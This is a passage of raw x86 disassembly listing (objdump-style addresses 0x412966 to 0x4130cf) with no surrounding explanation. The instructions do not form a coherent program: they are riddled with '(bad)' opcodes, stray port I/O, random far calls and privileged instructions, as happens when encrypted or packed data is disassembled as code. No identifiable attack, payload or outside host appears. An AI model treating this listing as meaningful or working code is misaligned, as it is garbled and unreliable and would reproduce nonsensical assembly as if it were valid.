  412966:	imul   ebx,DWORD PTR [edi-0x1bcbdbe6],0x80b8cecb
  412970:	sub    al,0xeb
  412972:	push   edi
  412973:	pop    eax
  412974:	dec    eax
  412975:	push   ds
  412976:	inc    esi
  412977:	push   ss
  412978:	push   esp
  412979:	cmp    BYTE PTR [edi+0x14ab46cc],dh
  41297f:	jo     0x4129cd
  412981:	scas   al,BYTE PTR es:[edi]
  412982:	dec    ebp
  412983:	cmp    al,0x96
  412985:	adc    ch,dh
  412987:	out    dx,eax
  412988:	je     0x412979
  41298a:	dec    ecx
  41298b:	fimul  DWORD PTR [edx+0x51adf8a6]
  412991:	push   0xa
  412993:	sbb    eax,0x2f072a53
  412998:	xor    al,0xf3
  41299a:	popf   
  41299b:	mul    DWORD PTR ds:0x2b859048
  4129a1:	or     bh,BYTE PTR [esi-0x4a11db32]
  4129a7:	retf   
  4129a8:	pop    edx
  4129a9:	xchg   ebx,eax
  4129aa:	int    0xb2
  4129ac:	shl    ecx,1
  4129ae:	cmp    ch,dh
  4129b0:	cmp    BYTE PTR [edi],ah
  4129b2:	inc    esp
  4129b3:	retf   0xdd9e
  4129b6:	jnp    0x4129b4
  4129b8:	loopne 0x412a36
  4129ba:	xor    eax,DWORD PTR [ecx-0x72]
  4129bd:	aas    
  4129be:	pop    ds
  4129bf:	outs   dx,DWORD PTR ds:[esi]
  4129c0:	xchg   esi,ebx
  4129c2:	add    DWORD PTR [ebx+0x73],edx
  4129c5:	xor    ebx,DWORD PTR [esi-0x65]
  4129c8:	pop    esp
  4129c9:	xor    al,0x6b
  4129cb:	aam    0xbf
  4129cd:	in     al,dx
  4129ce:	(bad)  
  4129cf:	sub    eax,0xeb53d959
  4129d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129d5:	lock cmp eax,0x9a4cf50c
  4129db:	mov    ch,0xa
  4129dd:	push   ecx
  4129de:	mov    ebp,0xc144a207
  4129e3:	push   edi
  4129e4:	fwait
  4129e5:	inc    edi
  4129e6:	adc    DWORD PTR [edx-0x704132d2],0x63cf6f32
  4129f0:	lea    ebx,[edx+edx*8-0x53]
  4129f4:	or     al,0x63
  4129f6:	or     al,0x76
  4129f8:	mov    ch,0x71
  4129fa:	mov    ch,0x3c
  4129fc:	nop
  4129fd:	ss inc edx
  4129ff:	into   
  412a00:	jne    0x4129b1
  412a02:	mov    ds:0x54ed6405,al
  412a07:	aas    
  412a08:	lock rol al,1
  412a0b:	or     bl,al
  412a0d:	(bad)  
  412a0e:	ins    DWORD PTR es:[edi],dx
  412a0f:	xchg   edi,eax
  412a10:	mov    ecx,0xc4700ad7
  412a15:	push   eax
  412a16:	popf   
  412a17:	sub    dh,al
  412a19:	xchg   ebp,eax
  412a1a:	ins    BYTE PTR es:[edi],dx
  412a1b:	xchg   DWORD PTR [esi*1+0x1f02d3b7],ebx
  412a22:	fldenv [edi]
  412a24:	int3   
  412a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a26:	arpl   WORD PTR [edi+0x7b1271dd],cx
  412a2c:	xor    eax,DWORD PTR [ecx]
  412a2e:	xchg   ebp,eax
  412a2f:	or     DWORD PTR [edi-0x2f577ee3],ebp
  412a35:	rol    BYTE PTR [ecx],1
  412a37:	push   edi
  412a38:	push   es
  412a39:	pusha  
  412a3a:	in     al,dx
  412a3b:	ins    DWORD PTR es:[edi],dx
  412a3c:	inc    esi
  412a3d:	add    ah,ch
  412a3f:	outs   dx,DWORD PTR ds:[esi]
  412a40:	or     DWORD PTR [edx+edx*1-0x7462a867],ecx
  412a47:	pop    eax
  412a48:	dec    edx
  412a49:	or     al,0x25
  412a4b:	adc    esp,DWORD PTR [esi-0x4631519d]
  412a51:	cmp    eax,0x2bd48d18
  412a56:	sbb    eax,0xaac501f3
  412a5b:	sbb    BYTE PTR [edi+edx*1+0x1f062f06],0x96
  412a63:	pop    edx
  412a64:	mov    ch,0xc8
  412a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a67:	or     bh,BYTE PTR [esi+0x52]
  412a6a:	out    dx,al
  412a6b:	jle    0x412acb
  412a6d:	inc    esi
  412a6e:	sbb    bh,BYTE PTR [ebx+0x0]
  412a71:	add    DWORD PTR [edi],edx
  412a73:	jp     0x412ae1
  412a75:	mov    eax,esi
  412a77:	scas   al,BYTE PTR es:[edi]
  412a78:	adc    dh,BYTE PTR [esi+0x4f]
  412a7b:	xchg   ebx,eax
  412a7c:	or     BYTE PTR [eax+0x7a1b4251],bl
  412a82:	add    edi,DWORD PTR es:[ecx+0x3c]
  412a86:	lds    edi,FWORD PTR ds:0xb415f13a
  412a8c:	push   0x40
  412a8e:	jge    0x412a27
  412a90:	pop    eax
  412a91:	ffree  st(0)
  412a93:	shl    cl,0x7b
  412a96:	in     eax,0x44
  412a98:	inc    esp
  412a99:	(bad)  
  412a9a:	pop    ebp
  412a9b:	mov    bh,0x1f
  412a9d:	popa   
  412a9e:	ficomp WORD PTR [esi-0x28]
  412aa1:	xchg   esp,eax
  412aa2:	lea    edi,[eax]
  412aa4:	stc    
  412aa5:	sub    dl,cl
  412aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aa8:	addr16 jno 0x412ab8
  412aab:	xlat   BYTE PTR cs:[ebx]
  412aad:	and    al,BYTE PTR [esi]
  412aaf:	xor    DWORD PTR [edi+0x1c],ebx
  412ab2:	(bad)  
  412ab3:	loopne 0x412b33
  412ab5:	push   eax
  412ab6:	or     al,BYTE PTR ds:0xbb281b20
  412abc:	mov    esi,0xa77cdab7
  412ac1:	ror    BYTE PTR [ecx],cl
  412ac3:	add    BYTE PTR [eax],bl
  412ac5:	add    ebp,DWORD PTR [eax+0x58]
  412ac8:	(bad)  
  412ac9:	mov    bh,0x3f
  412acb:	nop
  412acc:	je     0x412add
  412ace:	xchg   ecx,eax
  412acf:	popf   
  412ad0:	and    eax,0x8831267b
  412ad5:	adc    BYTE PTR [ebx-0x16e505d7],cl
  412adb:	push   0x9f35c837
  412ae0:	mov    ?,WORD PTR [edi-0x20]
  412ae3:	xchg   esp,eax
  412ae4:	jb     0x412aee
  412ae6:	add    eax,eax
  412ae8:	or     DWORD PTR [ebx-0x7d],eax
  412aeb:	adc    DWORD PTR [ecx+0x65],0xa2449179
  412af2:	ret    
  412af3:	ins    DWORD PTR es:[edi],dx
  412af4:	call   0x9f45:0x37a4dd9e
  412afb:	nop
  412afc:	in     al,0xa3
  412afe:	and    BYTE PTR [ebp+0x5b],ch
  412b01:	call   0x6d53:0x532d9662
  412b08:	sbb    al,0x68
  412b0a:	push   0x29
  412b0c:	neg    DWORD PTR [ebp-0x4e441423]
  412b12:	cmp    al,0xe0
  412b14:	pop    es
  412b15:	aaa    
  412b16:	(bad)  
  412b17:	fld    TBYTE PTR [edx-0x29]
  412b1a:	iret   
  412b1b:	jmp    0x412b56
  412b1d:	imul   ebp,DWORD PTR [eax],0xffffff80
  412b20:	cmp    BYTE PTR [ecx+0x67],ch
  412b23:	(bad)  
  412b24:	fdiv   DWORD PTR [esi-0x4c]
  412b27:	add    eax,DWORD PTR [ebx]
  412b29:	add    BYTE PTR [ecx],al
  412b2b:	push   esp
  412b2c:	pushf  
  412b2d:	call   0x64e405fd
  412b32:	or     eax,0x98195c81
  412b37:	icebp  
  412b38:	inc    ebp
  412b39:	dec    edi
  412b3a:	aaa    
  412b3b:	cld    
  412b3c:	inc    esi
  412b3d:	scas   al,BYTE PTR es:[edi]
  412b3e:	pop    edi
  412b3f:	loopne 0x412baa
  412b41:	push   ebp
  412b42:	jg     0x412bb1
  412b44:	(bad)  
  412b45:	dec    esi
  412b46:	lods   al,BYTE PTR ds:[esi]
  412b47:	rcr    BYTE PTR [edx-0x30fa1257],0x3b
  412b4e:	out    0xab,al
  412b50:	fisubr WORD PTR [ecx+esi*2-0x699f9602]
  412b57:	sbb    eax,0x410f801f
  412b5c:	mov    eax,ds:0x5c787ce4
  412b61:	pop    ecx
  412b62:	lock mov ebx,0xe484b5e6
  412b68:	cmp    ebp,0x4f
  412b6b:	sbb    BYTE PTR [eax-0x13],bh
  412b6e:	(bad)  
  412b6f:	rcr    BYTE PTR [edx+0x7e],0x24
  412b73:	mov    cs,WORD PTR [ebp-0x66]
  412b76:	adc    dh,dl
  412b78:	in     al,0x9
  412b7a:	xchg   esp,eax
  412b7b:	stos   BYTE PTR es:[edi],al
  412b7c:	sbb    bh,BYTE PTR [edi+ebp*4]
  412b7f:	not    DWORD PTR [edi-0x157a1188]
  412b85:	mov    edx,0x110f7ae3
  412b8a:	dec    ecx
  412b8b:	dec    ecx
  412b8c:	adc    eax,0xbd9dddcb
  412b91:	add    bl,cl
  412b93:	sub    dh,BYTE PTR [edx+0x21bd8e56]
  412b99:	dec    edx
  412b9a:	cmp    BYTE PTR [ecx+ebp*2-0x55],0x68
  412b9f:	mov    esi,0x6aaac6f2
  412ba4:	sub    DWORD PTR [eax],esp
  412ba6:	mov    eax,ds:0x4cf9f9eb
  412bab:	sub    DWORD PTR [edx-0xf],esi
  412bae:	pop    edx
  412baf:	xchg   esi,eax
  412bb0:	jnp    0x412b4b
  412bb2:	sbb    eax,0x45c3f348
  412bb7:	or     DWORD PTR [edx+0x7ebaf109],edi
  412bbd:	outs   dx,DWORD PTR ds:[esi]
  412bbe:	inc    eax
  412bbf:	(bad)  
  412bc0:	mov    edi,0x79e835f7
  412bc5:	cli    
  412bc6:	scas   al,BYTE PTR es:[edi]
  412bc7:	aad    0x50
  412bc9:	adc    DWORD PTR [eax+eax*4-0x80],0x6d
  412bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bcf:	xchg   ebx,eax
  412bd0:	sbb    esi,DWORD PTR [ebx]
  412bd2:	mov    eax,0xd785c794
  412bd7:	jmp    0x66823a99
  412bdc:	int3   
  412bdd:	dec    edx
  412bde:	xor    al,BYTE PTR [ebx+eiz*2+0x62]
  412be2:	scas   eax,DWORD PTR es:[edi]
  412be3:	outs   dx,BYTE PTR ds:[esi]
  412be4:	mov    esp,DWORD PTR [edi+0x3e]
  412be7:	dec    esi
  412be8:	bound  ebp,QWORD PTR [ecx+0x4e]
  412beb:	xchg   esp,eax
  412bec:	push   esi
  412bed:	xor    al,0x2f
  412bef:	out    0xe8,eax
  412bf1:	inc    ebp
  412bf2:	lock xchg ecx,eax
  412bf4:	jecxz  0x412c4e
  412bf6:	gs lahf 
  412bf8:	out    0x8d,al
  412bfa:	ret    
  412bfb:	lods   eax,DWORD PTR ds:[esi]
  412bfc:	mov    ebx,0x7278cc7
  412c01:	out    dx,eax
  412c02:	dec    eax
  412c03:	or     esp,DWORD PTR [ebp+0x51bc0b7e]
  412c09:	push   ebx
  412c0a:	push   ds
  412c0b:	sbb    cl,BYTE PTR [esi]
  412c0d:	inc    edx
  412c0e:	push   ebp
  412c0f:	shl    DWORD PTR [bx+di-0xc0b],0xb5
  412c15:	loope  0x412c68
  412c17:	sbb    DWORD PTR [edi+0x47061dfd],edx
  412c1d:	addr16 repz jnp 0x412c56
  412c21:	sbb    ah,bh
  412c23:	pop    esp
  412c24:	daa    
  412c25:	mov    eax,0x1e8765a2
  412c2a:	iret   
  412c2b:	mov    ebp,0xf6d73fa1
  412c30:	aaa    
  412c31:	inc    esi
  412c32:	add    edi,DWORD PTR [ecx-0x4463bdc8]
  412c38:	xchg   edi,eax
  412c39:	nop
  412c3a:	fisttp QWORD PTR [ecx+0x50]
  412c3d:	jmp    0xb935:0xfa58d4e8
  412c44:	into   
  412c45:	push   edx
  412c46:	sbb    eax,0xe548f631
  412c4b:	xlat   BYTE PTR ds:[ebx]
  412c4c:	dec    ebp
  412c4d:	cs enter 0x99d2,0xe1
  412c52:	sub    al,0xd
  412c54:	push   edi
  412c55:	aaa    
  412c56:	add    ebx,eax
  412c58:	pop    esp
  412c59:	out    0xc8,al
  412c5b:	in     al,dx
  412c5c:	fdiv   DWORD PTR [esi]
  412c5e:	je     0x412cc3
  412c60:	cmp    al,0x2e
  412c62:	xor    cl,BYTE PTR [eax]
  412c64:	hlt    
  412c65:	int    0x62
  412c67:	pop    ebp
  412c68:	mov    esi,0xab393e8f
  412c6d:	jnp    0x412c64
  412c6f:	pop    es
  412c70:	fld    DWORD PTR [edi]
  412c72:	push   es
  412c73:	sar    BYTE PTR [eax-0x716e2468],0xfc
  412c7a:	jge    0x412cd9
  412c7c:	repz push ecx
  412c7e:	pop    ecx
  412c7f:	or     al,0x9a
  412c81:	out    dx,al
  412c82:	scas   eax,DWORD PTR es:[edi]
  412c83:	pop    ecx
  412c84:	jl     0x412c74
  412c86:	cmp    ch,dl
  412c88:	sbb    al,0x92
  412c8a:	test   DWORD PTR [eax+0x7e97cd0],ebx
  412c90:	sub    bh,BYTE PTR [ebx+0x4422371d]
  412c96:	push   cs
  412c97:	(bad)  [edx-0x36528a5f]
  412c9d:	sar    DWORD PTR [eax-0x58],1
  412ca0:	stos   BYTE PTR es:[edi],al
  412ca1:	push   0x3c570014
  412ca6:	adc    al,0x6a
  412ca8:	popa   
  412ca9:	imul   eax,DWORD PTR [edi-0x6f5b872],0xaa380387
  412cb3:	xor    eax,0x8964473d
  412cb8:	pusha  
  412cb9:	test   eax,0x9703dbed
  412cbe:	or     cl,BYTE PTR [ebp-0x4f]
  412cc1:	pusha  
  412cc2:	sub    eax,0x341cf6a1
  412cc7:	push   edi
  412cc8:	pushf  
  412cc9:	outs   dx,BYTE PTR ds:[esi]
  412cca:	jne    0x412c9e
  412ccc:	push   ebp
  412ccd:	xchg   ebp,eax
  412cce:	imul   eax,edi,0x9b0ebe96
  412cd4:	call   0x7fc:0x4704d541
  412cdb:	(bad)  
  412cdc:	xor    bh,bh
  412cde:	stos   BYTE PTR es:[edi],al
  412cdf:	mov    ch,0x3a
  412ce1:	ds pop es
  412ce3:	push   esi
  412ce4:	xchg   ebx,eax
  412ce5:	pop    eax
  412ce6:	xor    al,0xdc
  412ce8:	and    al,0xdf
  412cea:	mov    dl,0xcf
  412cec:	fist   DWORD PTR [eax+0x7e]
  412cef:	jle    0x412c9a
  412cf1:	jl     0x412d0f
  412cf3:	in     eax,dx
  412cf4:	cwde   
  412cf5:	mov    esi,esp
  412cf7:	loopne 0x412d44
  412cf9:	sub    eax,0xaaaaa6a6
  412cfe:	xchg   DWORD PTR [ebx],eax
  412d00:	add    al,0xc3
  412d02:	fldenv [eax-0x560da87f]
  412d08:	sti    
  412d09:	out    dx,eax
  412d0a:	mov    ds:0x119e07fd,eax
  412d0f:	les    eax,FWORD PTR [ecx+0x1a030ac7]
  412d15:	pop    es
  412d16:	ins    BYTE PTR es:[edi],dx
  412d17:	sub    cl,BYTE PTR [ebx+0x76]
  412d1a:	stos   DWORD PTR es:[edi],eax
  412d1b:	sub    BYTE PTR [ecx+0x65d3d758],dl
  412d21:	dec    ecx
  412d22:	push   ebx
  412d23:	ds dec esi
  412d25:	push   es
  412d26:	test   BYTE PTR [edi+edi*1+0x7d6723ab],dl
  412d2d:	mov    edx,DWORD PTR [ecx+0x6e]
  412d30:	bound  esp,QWORD PTR [ebx+0x49]
  412d33:	lea    esp,[edx-0x19]
  412d36:	rcr    ebx,0xef
  412d39:	add    BYTE PTR [ebx],al
  412d3b:	retf   
  412d3c:	andps  xmm6,XMMWORD PTR [edi-0x3c]
  412d40:	or     BYTE PTR [ebp+0x5f],dl
  412d43:	adc    bh,BYTE PTR [ebp+0x2fe658a8]
  412d49:	jno    0x412d55
  412d4b:	adc    eax,0xcef3164c
  412d50:	dec    esp
  412d51:	leave  
  412d52:	add    al,0x41
  412d54:	in     al,0x47
  412d56:	xchg   ebx,eax
  412d57:	inc    BYTE PTR [esi-0x1c]
  412d5a:	shl    edx,0xb9
  412d5d:	cdq    
  412d5e:	pop    ds
  412d5f:	aam    0xc3
  412d61:	fiadd  WORD PTR [edx+0x56262287]
  412d67:	test   al,0x37
  412d69:	(bad)  
  412d6a:	cmp    ch,BYTE PTR [esi]
  412d6c:	out    dx,eax
  412d6d:	hlt    
  412d6e:	push   0x36937ed5
  412d73:	add    eax,0xf9f20f63
  412d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d79:	call   DWORD PTR [ecx-0x7a]
  412d7c:	push   ecx
  412d7d:	cmp    eax,0x784ad825
  412d82:	shl    DWORD PTR [edx-0x35],0x46
  412d86:	add    eax,0xe186a1b4
  412d8b:	shl    BYTE PTR [ecx+ebp*1],cl
  412d8e:	xor    eax,0xe410206d
  412d93:	or     DWORD PTR [esi+0x7a],0xbeee796d
  412d9a:	arpl   WORD PTR [ecx+0x2096261],si
  412da0:	icebp  
  412da1:	js     0x412e1d
  412da3:	cs aaa 
  412da5:	jmp    0x6e1919e6
  412daa:	jb     0x412e26
  412dac:	test   eax,0xa52b686f
  412db2:	outs   dx,DWORD PTR ds:[esi]
  412db3:	add    eax,0x66469ce9
  412db8:	sub    BYTE PTR [eax-0x5],dh
  412dbb:	mov    esp,0x2cb7fbe6
  412dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc1:	mov    esi,0xccf1db89
  412dc6:	mov    bh,0x33
  412dc8:	fistp  QWORD PTR [esi-0x2f]
  412dcb:	in     eax,0x13
  412dcd:	jne    0x412e1f
  412dcf:	out    0x6b,eax
  412dd1:	mov    ebp,ebx
  412dd3:	add    ebx,0x16
  412dd6:	mov    dh,0xc8
  412dd8:	xchg   ecx,eax
  412dd9:	jnp    0x412de8
  412ddb:	outs   dx,DWORD PTR ds:[esi]
  412ddc:	push   0xffffffa3
  412dde:	push   edi
  412ddf:	push   es
  412de0:	gs ret 0xfded
  412de4:	cmp    BYTE PTR [ebx+ebp*1+0x6a6455b8],cl
  412deb:	mov    DWORD PTR [edi+0x34],esi
  412dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412def:	push   esp
  412df0:	outs   dx,DWORD PTR ds:[esi]
  412df1:	inc    eax
  412df2:	mov    ebx,0x7dfa2fff
  412df7:	lods   eax,DWORD PTR ds:[esi]
  412df8:	dec    eax
  412df9:	stos   BYTE PTR es:[edi],al
  412dfa:	xor    bl,0x7f
  412dfd:	clc    
  412dfe:	sbb    esp,DWORD PTR [esi]
  412e00:	paddusb mm7,QWORD PTR [esi]
  412e03:	mov    WORD PTR [edi+0x1ce4fdf4],cs
  412e09:	shl    dh,cl
  412e0b:	je     0x412e28
  412e0d:	cs push esp
  412e0f:	scas   al,BYTE PTR es:[edi]
  412e10:	lock loope 0x412e42
  412e13:	xchg   ebp,eax
  412e14:	jae    0x412e8e
  412e16:	fisttp QWORD PTR [ebp-0x19]
  412e19:	lods   eax,DWORD PTR ds:[esi]
  412e1a:	jno    0x412e78
  412e1c:	arpl   dx,sp
  412e1e:	test   eax,0x74ede156
  412e23:	in     eax,0x58
  412e25:	push   eax
  412e26:	call   0x4a05:0x9bdded05
  412e2d:	add    al,0x90
  412e2f:	hlt    
  412e30:	(bad)  
  412e31:	xor    eax,0x2579e4ad
  412e36:	cli    
  412e37:	int    0x78
  412e39:	add    al,0xd1
  412e3b:	int    0x10
  412e3d:	jge    0x412de1
  412e3f:	push   ebx
  412e41:	xchg   ecx,eax
  412e42:	and    eax,0x2a036d18
  412e47:	mov    bl,BYTE PTR [eax]
  412e49:	sub    bh,dl
  412e4b:	mov    esp,0xedb47ff9
  412e50:	lds    ecx,FWORD PTR [edi]
  412e52:	mov    ah,0xf9
  412e54:	retf   
  412e55:	popa   
  412e56:	fsubr  QWORD PTR [edi+0x1248ea1d]
  412e5c:	add    al,0xa9
  412e5e:	jno    0x412e88
  412e60:	dec    ebp
  412e61:	dec    eax
  412e62:	xchg   ebp,eax
  412e63:	push   ss
  412e64:	fs dec edi
  412e66:	adc    DWORD PTR [eax-0x51],0xffffff91
  412e6a:	mov    DWORD PTR [ecx-0x30cc472f],edx
  412e70:	sbb    eax,0x24d80552
  412e75:	ret    
  412e76:	int    0x17
  412e78:	push   ss
  412e79:	(bad)  
  412e7a:	pop    ecx
  412e7b:	in     eax,dx
  412e7c:	pop    esi
  412e7d:	sub    BYTE PTR fs:[eax+0x561c915a],0xbb
  412e85:	jo     0x412eca
  412e87:	fbld   TBYTE PTR [ebp-0x38]
  412e8a:	pop    es
  412e8b:	cmc    
  412e8c:	neg    BYTE PTR [ebp+0x5076f315]
  412e92:	std    
  412e93:	mov    cl,0xb7
  412e95:	xor    eax,0xebeb653
  412e9a:	jp     0x412e8b
  412e9c:	adc    ebp,DWORD PTR [esi-0x5f7b8c4a]
  412ea2:	fnstenv [eax-0x4e]
  412ea5:	or     BYTE PTR [esi],cl
  412ea7:	shl    cl,cl
  412ea9:	fcomi  st,st(3)
  412eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eac:	and    al,BYTE PTR [esi+0x25]
  412eaf:	push   ecx
  412eb0:	(bad)  
  412eb1:	in     eax,0xdb
  412eb3:	adc    eax,0x1eaa3103
  412eb8:	pop    eax
  412eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eba:	mov    esi,0x876808b8
  412ebf:	daa    
  412ec0:	dec    esp
  412ec1:	test   cl,dh
  412ec3:	xor    DWORD PTR [ebp+0x35297379],ebp
  412ec9:	xchg   ebx,eax
  412eca:	jae    0x412eaf
  412ecc:	outs   dx,BYTE PTR ds:[esi]
  412ecd:	aas    
  412ece:	lahf   
  412ecf:	sub    eax,0x74b7ef9a
  412ed4:	stc    
  412ed5:	ja     0x412e8b
  412ed7:	sbb    DWORD PTR [edx-0x368375e0],ebx
  412edd:	pop    esp
  412ede:	aas    
  412edf:	sub    DWORD PTR [ebp+0x3c61fb27],0x58
  412ee6:	fst    DWORD PTR [esi+0x3e]
  412ee9:	inc    edx
  412eea:	mov    edx,DWORD PTR [ebp+eax*1-0x1a]
  412eee:	mov    edx,esp
  412ef0:	sbb    DWORD PTR [edi+eiz*8],0xffffffc7
  412ef4:	mov    ds:0x3f4c32fb,eax
  412ef9:	out    dx,al
  412efa:	push   0x930339c8
  412eff:	repz ds fcom st(3)
  412f03:	and    BYTE PTR [esi],ch
  412f05:	jo     0x412f6e
  412f07:	cwde   
  412f08:	mov    ch,0xdb
  412f0a:	sbb    esi,DWORD PTR [eax]
  412f0c:	in     eax,0x66
  412f0e:	jmp    0x4b47:0xdb401a24
  412f15:	jecxz  0x412f25
  412f17:	mov    ecx,0x1da54f6c
  412f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f1d:	jno    0x412f7f
  412f1f:	mov    cl,BYTE PTR [ebx+ecx*1-0x6e14256a]
  412f26:	cmp    edi,esi
  412f28:	aas    
  412f29:	nop
  412f2a:	out    0xe2,eax
  412f2c:	cmp    DWORD PTR ss:[edi],esp
  412f2f:	cmp    al,BYTE PTR [eax+0x42]
  412f32:	test   al,0xe4
  412f34:	push   esi
  412f35:	xor    esi,edx
  412f37:	sub    al,0xab
  412f39:	inc    eax
  412f3a:	xchg   edx,eax
  412f3b:	push   eax
  412f3c:	adc    eax,0x765959a
  412f41:	and    al,0x9e
  412f43:	call   0x4540731a
  412f48:	ja     0x412f2c
  412f4a:	add    eax,0x1f35c562
  412f4f:	pop    ebx
  412f50:	push   ebx
  412f51:	scas   al,BYTE PTR es:[edi]
  412f52:	into   
  412f53:	or     edi,DWORD PTR [ecx]
  412f55:	cmp    esp,esp
  412f57:	stos   DWORD PTR es:[edi],eax
  412f58:	lods   al,BYTE PTR ds:[esi]
  412f59:	fistp  QWORD PTR [edi]
  412f5b:	xchg   edi,eax
  412f5c:	mov    ebx,ecx
  412f5e:	sar    BYTE PTR [ebx-0x1f],0xe6
  412f62:	push   esi
  412f63:	inc    eax
  412f64:	and    al,BYTE PTR [esi]
  412f66:	push   ebx
  412f67:	ins    BYTE PTR es:[edi],dx
  412f68:	inc    eax
  412f69:	fisubr WORD PTR [eax+ecx*4]
  412f6c:	adc    BYTE PTR [esi-0x8],cl
  412f6f:	pushf  
  412f70:	add    cl,ch
  412f72:	or     al,0xe8
  412f74:	(bad)  
  412f76:	jp     0x412fb2
  412f78:	sbb    eax,0xa2f91ef7
  412f7d:	stos   DWORD PTR es:[edi],eax
  412f7e:	cmp    eax,0x7de69344
  412f83:	mov    eax,ds:0xd440d02a
  412f88:	mov    esi,0x41c40822
  412f8d:	push   eax
  412f8e:	aaa    
  412f8f:	jmp    0x8ebf3781
  412f94:	xchg   ecx,eax
  412f95:	(bad)  
  412f97:	inc    esp
  412f98:	scas   al,BYTE PTR es:[edi]
  412f99:	je     0x41301a
  412f9b:	scas   eax,DWORD PTR es:[edi]
  412f9c:	jae    0x412f50
  412f9e:	inc    edx
  412f9f:	jmp    0x463d049b
  412fa4:	xchg   ebx,eax
  412fa5:	stos   BYTE PTR es:[edi],al
  412fa6:	sub    ebp,DWORD PTR [ebx-0x541571ca]
  412fac:	inc    ebx
  412fad:	xchg   ebp,eax
  412fae:	push   ds
  412faf:	or     eax,0xbe369615
  412fb4:	outs   dx,DWORD PTR ds:[esi]
  412fb5:	xchg   ecx,eax
  412fb6:	fadd   st,st(4)
  412fb8:	mov    ch,ah
  412fba:	pop    esi
  412fbb:	(bad)  
  412fbc:	xor    dl,BYTE PTR [ecx+0x13]
  412fbf:	icebp  
  412fc0:	iret   
  412fc1:	push   ecx
  412fc2:	addr16 loop 0x412fc7
  412fc5:	cmp    DWORD PTR [ebx],eax
  412fc7:	scas   eax,DWORD PTR es:[edi]
  412fc8:	push   eax
  412fc9:	aad    0x4a
  412fcb:	in     eax,dx
  412fcc:	les    eax,FWORD PTR [edi+0x2c]
  412fcf:	sub    ch,al
  412fd1:	or     al,0x2c
  412fd3:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  412fd5:	leave  
  412fd6:	push   esp
  412fd7:	dec    ecx
  412fd8:	cwde   
  412fd9:	mov    ebx,DWORD PTR [ebx+0x6f]
  412fdc:	sub    eax,0x29ce240f
  412fe1:	push   0x2a
  412fe3:	inc    edx
  412fe4:	xor    eax,0x8535c37
  412fe9:	pop    esi
  412fea:	gs mov bl,0x2d
  412fed:	call   0xeb03:0x12528389
  412ff4:	sbb    bh,ch
  412ff6:	iret   
  412ff7:	aas    
  412ff8:	jp     0x413048
  412ffa:	xchg   ecx,eax
  412ffb:	sub    DWORD PTR [ecx-0x37dbca85],ebx
  413001:	xlat   BYTE PTR ds:[ebx]
  413002:	outs   dx,BYTE PTR ds:[esi]
  413003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413004:	outs   dx,DWORD PTR ds:[esi]
  413005:	ja     0x413046
  413007:	push   cs
  413008:	(bad)  
  413009:	out    0xbd,al
  41300b:	in     al,0xae
  41300d:	push   0x77
  41300f:	stos   DWORD PTR es:[edi],eax
  413010:	push   ds
  413011:	out    0x4b,al
  413013:	(bad)  [edx-0x53]
  413016:	les    ecx,FWORD PTR [esi]
  413018:	cmp    al,0xbc
  41301a:	nop
  41301b:	(bad)  
  41301d:	sub    ch,BYTE PTR [esi]
  41301f:	jno    0x41306e
  413021:	pop    ebx
  413022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413023:	xchg   edx,eax
  413024:	pop    esp
  413025:	pop    eax
  413026:	shl    BYTE PTR [edi],0x38
  413029:	jmp    0x412fae
  41302b:	inc    eax
  41302c:	jnp    0x41305d
  41302e:	push   0xd064ce2f
  413033:	out    0x74,al
  413035:	jl     0x413083
  413037:	add    eax,DWORD PTR [ecx+0x1e]
  41303a:	(bad)  
  41303b:	or     al,0x2d
  41303d:	dec    esi
  41303e:	adc    ecx,DWORD PTR [edi-0x5fca34e8]
  413044:	push   ds
  413045:	xor    esi,DWORD PTR [eax+ebp*1+0x78]
  413049:	outs   dx,BYTE PTR ds:[esi]
  41304a:	mov    ch,BYTE PTR [ebx+eiz*1]
  41304d:	mov    edx,0x7b1b0406
  413052:	sub    eax,0xb884ba18
  413057:	mov    BYTE PTR [eax],0xb8
  41305a:	rcl    DWORD PTR [ebp-0x6],cl
  41305d:	mov    dl,0x5a
  41305f:	or     DWORD PTR [edx+0x2ba35a6d],eax
  413065:	mov    al,ds:0x5802847e
  41306a:	jge    0x413092
  41306c:	xchg   ebx,eax
  41306d:	mov    ah,0x5b
  41306f:	aas    
  413070:	xchg   esp,eax
  413071:	cwde   
  413072:	sahf   
  413073:	sti    
  413074:	jns    0x41300e
  413076:	jmp    0xae6c:0x48d2c942
  41307d:	push   esi
  41307e:	repz out dx,al
  413080:	js     0x4130d1
  413082:	cmp    BYTE PTR [edx-0x1a],bl
  413085:	int3   
  413086:	aas    
  413087:	mov    bh,0x13
  413089:	fcom   QWORD PTR [ebx-0x507bccc2]
  41308f:	mov    ebp,0xf9e1d218
  413094:	clc    
  413095:	jg     0x413079
  413097:	push   ebp
  413098:	jmp    0x4130b4
  41309a:	popf   
  41309b:	in     al,dx
  41309c:	leave  
  41309d:	push   eax
  41309e:	adc    al,0x0
  4130a0:	inc    ebp
  4130a1:	(bad)  
  4130a2:	jns    0x413099
  4130a4:	mov    edi,0x84b62c6c
  4130a9:	mov    DWORD PTR [edx+0x56],edx
  4130ac:	push   0xffffffcd
  4130ae:	(bad)  
  4130af:	cmp    eax,DWORD PTR [ebx]
  4130b1:	cmp    dl,BYTE PTR [esi+0x78]
  4130b4:	cmp    eax,0x2158c1e9
  4130b9:	(bad)  
  4130ba:	fwait
  4130bb:	xor    DWORD PTR [esi+0x11],ebp
  4130be:	mov    eax,0xe952bdc3
  4130c3:	shl    BYTE PTR [esp+eiz*2],0xdd
  4130c7:	jne    0x413092
  4130c9:	mov    edx,0x2a74cfe
  4130ce:	push   esp
  4130cf:	xor    bl,BYTE PTR [ecx-0x689b33f1]
